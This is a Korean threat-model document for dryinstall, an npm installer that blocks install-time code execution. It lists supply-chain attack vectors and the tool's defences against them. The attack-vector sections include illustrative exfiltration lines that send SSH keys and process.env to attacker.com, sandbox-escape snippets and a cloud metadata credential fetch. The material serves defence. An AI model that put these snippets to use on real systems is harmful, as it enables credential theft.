# 위협 모델 — dryinstall

**버전:** 1.0  
**범위:** npm 패키지 설치 파이프라인  
**문서 유형:** 보안 연구 문서

---

## 1. 개요

이 문서는 Node.js 패키지 생태계의 설치 단계 원격 코드 실행(RCE)을 차단하기 위해 설계된 보안 npm 인스톨러 **dryinstall**의 위협 모델을 정의합니다.

### 시스템 목적

dryinstall은 npm 설치 파이프라인을 가로채어, lifecycle 스크립트가 실행되기 전에 패키지를 격리 저장소(`dry_modules/`)로 이동시킵니다. 설치 과정에서 호스트 시스템에서 임의의 코드가 실행되지 않도록 보장합니다.

### 핵심 보안 보장

> **설치 중 코드 실행 제로 (Zero code executed during install)**

postinstall, prepare, preinstall 등 어떤 lifecycle 스크립트도 설치 단계에서 실행되지 않습니다.

---

## 2. 보호 대상 자산

dryinstall이 보호하는 자산 목록입니다.

| 자산 | 설명 | 위험도 |
|---|---|---|
| SSH 키 | `~/.ssh/id_rsa`, `~/.ssh/config` | 치명적 |
| 환경 변수 | `.env`, `process.env` — API 키, 토큰, DB 비밀번호 | 치명적 |
| npm 토큰 | `~/.npmrc`, `NPM_TOKEN` | 치명적 |
| 클라우드 자격증명 | `~/.aws/credentials`, GCP, Azure 키 | 치명적 |
| 소스 코드 | 프로젝트 파일, 독점 코드 | 높음 |
| 셸 히스토리 | `~/.bash_history`, `~/.zsh_history` | 높음 |
| Git 자격증명 | `~/.gitconfig`, 저장된 토큰 | 높음 |
| 시스템 바이너리 | PATH 조작, 바이너리 교체 | 높음 |
| 네트워크 | 공격자 인프라로의 아웃바운드 연결 | 보통 |

---

## 3. 위협 행위자 (Threat Actors)

### TA-1: 악성 패키지 배포자
- **동기:** 금전적 이득, 스파이활동, 사보타주
- **능력:** npm 레지스트리에 패키지 배포 가능
- **방법:** `postinstall` 또는 `prepare` 스크립트에 공격 코드 삽입
- **실제 사례:** `event-stream` (2018), `cline-cli` (2026)

### TA-2: 계정 탈취된 메인테이너
- **동기:** 계정 탈취, 소셜 엔지니어링
- **능력:** 신뢰받는 패키지의 정당한 배포 권한 보유
- **방법:** 기존 인기 패키지에 악성 페이로드 삽입
- **실제 사례:** `xz-utils` (2024) — 2년에 걸친 공급망 침투

### TA-3: 타이포스쿼터 (Typosquatter)
- **동기:** 자격증명 탈취
- **능력:** 유사한 패키지명 등록 가능
- **방법:** `reacts`, `expres`, `lodas` 등을 등록하여 오타를 기다림
- **실제 사례:** `coffe-script`, `mongose`, `cross-env` 변형 패키지들

### TA-4: 의존성 체인 공격자
- **동기:** 전이적 의존성을 통한 최대 피해 범위
- **능력:** 가시성이 낮은 깊은 의존성 패키지 침투
- **방법:** 많은 패키지가 의존하지만 감사 빈도가 낮은 패키지를 타깃

---

## 4. 공격 벡터 (Attack Vectors)

### AV-1: Lifecycle Script RCE (핵심 위협)

**설명:** npm이 설치 과정에서 자동으로 실행하는 스크립트를 악용합니다.

```
npm install 악성패키지
  → postinstall: node steal.mjs 자동 실행
  → ~/.ssh/id_rsa 읽기
  → curl https://attacker.com/collect -d @/tmp/keys
  → 피해 완료 (사용자는 모름)
```

**대상 스크립트:**
```
preinstall    설치 전 실행
install       설치 중 실행
postinstall   설치 후 실행  ← 가장 많이 악용
prepare       패키지 준비 시 실행
prepack       패키징 전 실행
postpack      패키징 후 실행
prepublish    배포 전 실행
```

**dryinstall 대응:** 위 스크립트 전체를 실행 전 탐지하여 차단합니다.

---

### AV-2: 의존성 체인 공격 (Supply Chain)

**설명:** 직접 설치하는 패키지가 아닌, 의존성 트리 깊숙한 곳의 패키지를 통해 공격합니다.

```
개발자가 설치하는 패키지
  └ dependency-A
      └ dependency-B
          └ dependency-C  ← 여기에 악성 postinstall 삽입
```

**실제 규모:**
```
puppeteer 하나 설치 시 → 1518개 의존성 패키지 포함
그 중 363개가 lifecycle 스크립트 보유
→ 363번의 잠재적 RCE 기회
```

**dryinstall 대응:** `_checkDependencyLifecycles()`로 의존성 트리를 재귀적으로 3단계까지 탐색하여 모든 lifecycle 스크립트를 탐지하고 차단합니다.

---

### AV-3: 타이포스쿼팅 (Typosquatting)

**설명:** 개발자의 오타를 노려 악성 패키지를 설치하도록 유도합니다.

```bash
npm install puppetee   # puppeteer의 오타
npm install expres     # express의 오타
npm install reacts     # react의 오타
```

**위험성:** 오타 패키지는 정상 패키지와 동일한 설치 과정을 거치므로 postinstall이 그대로 실행됩니다.

**dryinstall 대응:** Levenshtein Distance 알고리즘으로 npm 상위 1000개 패키지 + 로컬 패키지 목록과 비교합니다.
```
✗ Package not found: puppetee
Did you mean: puppeteer ?
```

---

### AV-4: install-time 네트워크 탈취

**설명:** postinstall 스크립트가 외부 서버로 데이터를 전송합니다.

```javascript
// 악성 postinstall 예시
const env = JSON.stringify(process.env);
require('https').request('https://attacker.com/collect', {
  method: 'POST', body: env
}).end();
```

**탈취 대상:**
- `process.env` 전체 (API 키, DB 비밀번호, 클라우드 자격증명)
- `~/.npmrc` (npm 토큰)
- `~/.aws/credentials` (AWS 키)

**dryinstall 대응:** `network-analyzer.js`가 설치 중 모든 HTTP/HTTPS 요청을 가로챕니다. npm 레지스트리 이외의 도메인은 차단합니다.

---

### AV-5: Sandbox 탈출 시도

**설명:** vm.createContext() 격리를 우회하는 기법입니다.

```javascript
// 공격 기법 1: Function 생성자 악용
const process = Function("return process")();

// 공격 기법 2: prototype 체인 악용
const escape = {}.constructor.constructor;
escape("return process")();

// 공격 기법 3: 우회 require
process.mainModule.require('child_process').exec('curl attacker.com');
```

**dryinstall 대응:**
- `Function` 객체를 Proxy로 교체하여 호출 즉시 차단
- `eval()` 비활성화
- `process.mainModule.require`, `Module.createRequire`, `vm.runInThisContext` 패치

---

### AV-6: 네이티브 애드온 (.node 파일)

**설명:** JavaScript sandbox를 완전히 우회하는 C++ 네이티브 모듈입니다.

```
package.json
  → "install": "node-gyp rebuild"
  → 빌드 완료 → malicious.node 생성
  → require('./malicious.node') → OS 직접 접근
```

**해당 패키지 예시:** `bcrypt`, `sharp`, `sqlite3`, `canvas`

**dryinstall 한계:** JavaScript 레벨에서 차단 불가합니다. OS 레벨 격리(Docker, seccomp)가 필요합니다.

> **완화책:** dryinstall은 빌드 스크립트(`node-gyp rebuild`) 자체를 lifecycle 차단으로 막아 `.node` 파일이 생성되지 않도록 합니다.

### AV-7: Maintainer Account Takeover

**설명:** 기존 메인테이너 계정을 탈취하여 정상 패키지에 악성코드를 삽입합니다.

```
공격자 → maintainer 계정 탈취
  → popular-lib@2.1.1 (악성) 배포
  → 개발자는 공식 업데이트로 믿고 설치
  → 피해 완료
```

**실제 사례:** `ua-parser-js` (2021), `coa` (2021), `event-stream` (2018)

**dryinstall 대응:** `maintainer-monitor.js`가 `~/.dryinstall-maintainers.json`에 메인테이너 이력을 추적합니다. 새 버전 설치 시 메인테이너 변경 여부를 비교하고, 전원 교체 시 CRITICAL로 차단합니다.

---

### AV-8: Version Poisoning

**설명:** 특정 버전에만 악성코드를 삽입하여 탐지를 회피합니다.

```
lib v1.0.1 → 정상
lib v1.0.2 → 악성 (child_process 추가)
lib v1.0.3 → 정상 (탐지 후 롤백)
```

**dryinstall 대응:** `version-diff-analyzer.js`가 이전 버전 tarball과 현재 버전 tarball의 JS 파일을 비교합니다. 위험 패턴이 새로 추가된 경우 탐지하고 CRITICAL이면 차단합니다.

---

### AV-9: Stealth Backdoor (조건부 실행)

**설명:** 로컬 개발 환경에서는 정상 동작하고, 특정 환경에서만 악성코드를 실행합니다.

```javascript
// CI/CD 서버에서만 실행
if (process.env.CI) { require('./steal') }

// 특정 회사 서버에서만 실행
if (os.hostname().includes("corp")) { stealSecrets() }

// AWS 인스턴스에서만 실행 (클라우드 메타데이터 탈취)
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')

// 특정 날짜 이후 실행 (Time Bomb)
if (Date.now() >= 1700000000000) { runMalware() }
```

**dryinstall 대응:** `stealth-detector.js`가 설치 전 tarball 내 JS 파일을 정적 분석합니다. 10개의 스텔스 패턴을 탐지하며 CRITICAL 패턴 발견 시 차단합니다.

---

### AV-10: Dependency Confusion Attack

**설명:** 내부 패키지와 동일한 이름으로 public npm에 더 높은 버전을 등록합니다.

```
@company/auth (internal, v1.0.0)
@company/auth (public npm, v9.9.9) ← 공격자 등록

npm은 버전이 높은 public 패키지를 우선 설치
```

**실제 피해:** Microsoft, Apple, Tesla, PayPal 등 35개 기업

**dryinstall 대응:** `confusion-detector.js`가 scoped 패키지 설치 시 public npm에 동일 이름 존재 여부와 버전을 비교합니다.

---

### AV-11: 패키지 변조 (Hash Mismatch)

**설명:** 같은 버전 번호를 유지하면서 tarball 내용을 변조합니다.

```
express@4.18.2 (정상)  SHA512: abc123...
express@4.18.2 (변조)  SHA512: xyz789... ← 내용이 다름
```

**dryinstall 대응:** `hash-verifier.js`가 설치 전 tarball의 SHA512를 registry 기록과 비교합니다. 불일치 시 즉시 차단합니다.

---

| 위협 | 가능성 | 영향 | dryinstall 대응 | 잔여 위험 |
|---|---|---|---|---|
| Lifecycle Script RCE | 높음 | 치명적 | 완전 차단 | 낮음 |
| 의존성 체인 공격 | 높음 | 치명적 | 재귀 탐지 + 차단 | 낮음 |
| 타이포스쿼팅 | 보통 | 높음 | 탐지 + 경고 | 낮음 |
| install-time 네트워크 탈취 | 보통 | 치명적 | 요청 가로채기 + 차단 | 낮음 |
| Dependency Confusion | 보통 | 치명적 | 이름+버전 비교 차단 | 낮음 |
| 패키지 변조 (Hash Mismatch) | 낮음 | 치명적 | SHA512 검증 | 낮음 |
| Version Poisoning | 보통 | 치명적 | 버전 간 diff 분석 | 보통 |
| Stealth Backdoor (CI 조건부) | 보통 | 치명적 | 정적 패턴 탐지 | 보통 |
| Time Bomb | 낮음 | 높음 | 날짜 조건 탐지 | 보통 |
| base64/난독화 코드 | 보통 | 높음 | eval/Function 탐지 | 보통 |
| 클라우드 메타데이터 탈취 | 낮음 | 치명적 | 169.254.x.x 탐지 | 낮음 |
| Maintainer Account Takeover | 보통 | 치명적 | 메인테이너 변경 추적 | 보통 |
| Protestware (고의 사보타주) | 낮음 | 높음 | 무한루프 패턴 탐지 | 보통 |
| Sandbox 탈출 | 낮음 | 높음 | Function/eval 차단 + 패치 | 보통 |
| 네이티브 애드온 | 낮음 | 치명적 | build script 차단 (부분) | 높음 |
| dynamic import() | 낮음 | 보통 | 미대응 | 높음 |

---

## 6. 방어 설계 원칙

### 원칙 1: Zero Execution by Default
설치 단계에서 어떤 코드도 실행되지 않는 것이 기본값입니다. 허용은 명시적으로만 가능합니다.

### 원칙 2: Defense in Depth (다층 방어)
단일 방어선이 뚫려도 다음 레이어가 막습니다.
```
Layer 1 (Audit)    → 알려진 CVE 차단
Layer 2 (Lifecycle)→ 실행 시도 차단
Layer 3 (Sandbox)  → 런타임 API 차단
Loader             → require() hook 차단
Network Analyzer   → 네트워크 탈취 차단
```

### 원칙 3: Fail Secure
판단이 불가능한 경우 차단을 기본값으로 합니다. interactive 모드에서 타임아웃 시 자동으로 block 처리됩니다.

### 원칙 4: Least Privilege
`dryinstall.policy.json`으로 패키지별 최소 권한만 부여합니다.
```json
{
  "axios": { "allow": ["http", "https"] },
  "sharp": { "allow": ["fs"] }
}
```

### 원칙 5: Transparency
모든 차단 동작을 로그로 기록하고, interactive 모드에서 사용자에게 정확한 정보(위험도, 명령어 내용, 소스코드)를 제공합니다.

---

## 7. 기존 도구와의 비교

| 도구 | lifecycle 차단 | 실행 전 방어 | 런타임 방어 | 타이포 탐지 | 네트워크 감시 | Confusion | Hash 검증 | Stealth 탐지 | Maintainer 추적 |
|---|---|---|---|---|---|---|---|---|---|
| `npm audit` | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `socket.dev` | ✗ | ✗ | ✗ | △ | ✗ | △ | ✗ | △ | ✗ |
| `LavaMoat` | ✗ | ✗ | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ | ✗ |
| `dryinstall` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |

**핵심 차별점:** `npm audit`과 `socket.dev`는 위험을 *알려주지만* 실행은 막지 않습니다. `LavaMoat`은 런타임은 보호하지만 설치 단계는 보호하지 않습니다. dryinstall은 **설치 단계 자체**를 보호합니다.

---

## 8. 한계 및 향후 과제

### 현재 한계

**L-1: 네이티브 애드온**
`.node` 파일은 JavaScript sandbox 외부에서 동작합니다. 완전한 방어는 컨테이너 격리가 필요합니다.

**L-2: dynamic import()**
ES 모듈의 `import()`는 Node.js 모듈 로더 레벨에서 완전한 가로채기가 불가능합니다.

**L-3: 의존성 설치 미완성**
현재 dryinstall은 최상위 패키지의 tarball만 `dry_modules/`에 저장합니다. 전이적 의존성의 실제 파일은 설치하지 않으므로, 실제 런타임 실행을 위해서는 추가 작업이 필요합니다.

**L-4: False Positive**
`tsc`, `npm run build` 같은 정상적인 빌드 스크립트도 차단됩니다. `--allow-package` 또는 `.dryinstallrc`로 수동 허용이 필요합니다.

### 향후 과제

- **완전한 의존성 설치:** 전이적 의존성까지 포함한 완전한 설치 파이프라인
- **SBOM 연동:** Software Bill of Materials 생성 및 검증
- **CI/CD 통합:** GitHub Actions, GitLab CI에서 사용 가능한 Action/Plugin
- **정책 자동화:** 패키지 동작 기반 자동 정책 생성
- **OS 레벨 격리 연동:** seccomp, Docker와의 통합으로 네이티브 애드온 대응

---

## 9. 실험적 위협 모델 검증

### 실험: scan 결과를 통한 역추론

실제 환경에서 `npm install express` 후 `dryinstall scan`을 실행한 결과입니다.

```
node_modules/ 잔류 (60개)   → lifecycle 스크립트 없음
dry_modules/  격리 (17개)   → lifecycle 스크립트 보유
```

**dry_modules/ 로 격리된 패키지:**
```
body-parser, bytes, content-disposition, content-type,
escape-html, get-intrinsic, ipaddr.js, media-typer,
mime-types, ms, negotiator, path-to-regexp, qs, router
```

**node_modules/ 에 잔류한 패키지:**
```
express, cookie, debug, etag, fresh, inherits,
on-finished, parseurl, statuses, vary ...
```

### 이 실험이 드러내는 것

scan 결과를 보면 dryinstall의 판단 기준이 역으로 노출됩니다.

```
공격자 관점:
"lifecycle 스크립트가 없으면 dry_modules/로 가지 않는다"
  → postinstall 없이 index.js 자체에 악성 코드 삽입
  → require() 시점에 실행
  → Layer 2는 우회 가능
```

### 이것이 3-Layer가 필요한 이유

Layer 2 (lifecycle 차단)만으로는 이 우회가 가능합니다. 그래서 Layer 3 (sandbox)와 loader가 필요합니다.

```
공격자가 index.js에 악성 코드 삽입
  → Layer 2: lifecycle 없으므로 통과
  → Layer 3: require() 시 sandbox에서 실행
             fs.readFile('~/.ssh/id_rsa') → BLOCKED
             http.request('attacker.com') → BLOCKED
  → loader:  require() hook이 가로채서 sandbox로 라우팅
```

**결론:** scan 결과의 분포 자체가 위협 표면을 시각화합니다. `dry_modules/`에 없는 패키지가 오히려 런타임 공격의 잠재적 벡터입니다.

---

## 10. 결론

npm 생태계의 supply-chain 공격은 대부분 **설치 단계**에서 발생합니다. 기존 보안 도구들이 탐지와 경고에 집중하는 동안, dryinstall은 실행 자체를 차단하는 구조적 접근을 취합니다.

핵심 통찰:

> 탐지가 실패해도 실행은 막혀야 한다. 구조가 보안이다.

1518개의 의존성 패키지, 363개의 lifecycle 스크립트, 그리고 설치 중 실행된 코드 0줄 — 이것이 dryinstall의 위협 모델이 실현하는 보안 보장입니다.
